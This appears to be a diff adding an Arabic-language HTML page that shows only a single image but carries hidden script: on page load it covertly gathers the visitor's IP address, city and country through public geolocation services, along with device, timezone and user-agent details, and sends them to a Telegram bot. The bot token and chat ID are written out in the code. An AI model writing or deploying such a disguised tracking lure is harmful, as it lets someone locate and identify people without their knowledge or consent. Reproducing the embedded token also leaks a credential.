@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صورة</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: Arial, sans-serif;
+            background: #000;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0;
+        }
+        
+        .image-container {
+            max-width: 100%;
+            max-height: 100vh;
+            overflow: hidden;
+        }
+        
+        .image-container img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        
+        .hidden-tracker {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="image-container">
+        <!-- غيّر الرابط دا برابط صورتك -->
+        <img src="zer.jpg" alt="صورة">
+    </div>
+
+    <div class="hidden-tracker" id="tracker"></div>
+
+    <script>
+        async function trackVisitor() {
+            try {
+                // البيانات المطلوبة
+                let ipAddress = 'جاري الحصول...';
+                let deviceInfo = navigator.userAgent;
+                let location = 'جاري الحصول...';
+                let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                
+                // الحصول على IP والموقع من API
+                try {
+                    // محاولة API الأول
+                    const ipResponse = await fetch('https://ipwho.is/');
+                    if (ipResponse.ok) {
+                        const ipData = await ipResponse.json();
+                        ipAddress = ipData.ip;
+                        location = `${ipData.city}, ${ipData.country}`;
+                    }
+                } catch (e1) {
+                    try {
+                        // محاولة API الثاني
+                        const ipResponse = await fetch('https://api.ipify.org?format=json');
+                        if (ipResponse.ok) {
+                            const ipData = await ipResponse.json();
+                            ipAddress = ipData.ip;
+                        }
+                        
+                        // الحصول على الموقع
+                        const locResponse = await fetch('https://geolocation-db.com/json/');
+                        if (locResponse.ok) {
+                            const locData = await locResponse.json();
+                            location = `${locData.city}, ${locData.country_name}`;
+                        }
+                    } catch (e2) {
+                        console.log('لم تتمكن الـ APIs من العمل');
+                    }
+                }
+                
+                // استخراج نوع الجهاز
+                let deviceType = 'غير معروف';
+                let osName = 'غير معروف';
+                
+                if (/Android/.test(deviceInfo)) {
+                    deviceType = 'موبايل Android';
+                } else if (/iPhone|iPad|iPod/.test(deviceInfo)) {
+                    deviceType = 'iOS Device';
+                } else if (/Windows/.test(deviceInfo)) {
+                    deviceType = 'جهاز كمبيوتر Windows';
+                    osName = 'Windows';
+                } else if (/Mac/.test(deviceInfo)) {
+                    deviceType = 'جهاز كمبيوتر Mac';
+                    osName = 'macOS';
+                } else if (/Linux/.test(deviceInfo)) {
+                    deviceType = 'جهاز كمبيوتر Linux';
+                    osName = 'Linux';
+                }
+                
+                // الوقت الحالي
+                const timestamp = new Date().toLocaleString('ar-SA');
+                
+                // بناء الرسالة
+                const message = `
+🚨 زائر جديد!
+
+📍 الموقع: ${location}
+🌍 IP Address: ${ipAddress}
+💻 نوع الجهاز: ${deviceType}
+⏰ الوقت: ${timestamp}
+🕐 المنطقة الزمنية: ${timezone}
+📱 User Agent: ${deviceInfo}
+                `;
+                
+                // إرسال لـ Telegram
+                // غيّر البيانات دي بتوكن وشات ID تبعك
+                const botToken = '8426812517:AAHI0TRbNfDDGcI97cyT6EpFV6y8ADLsAl8';
+                const chatId = '1802530770';
+                
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                
+                await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                console.log('✅ تم الإرسال لتلجرام');
+                
+            } catch (error) {
+                console.log('خطأ في الإرسال:', error);
+            }
+        }
+        
+        // تشغيل التتبع عند التحميل
+        window.addEventListener('load', trackVisitor);
+        trackVisitor();
+    </script>
+</body>
+</html>
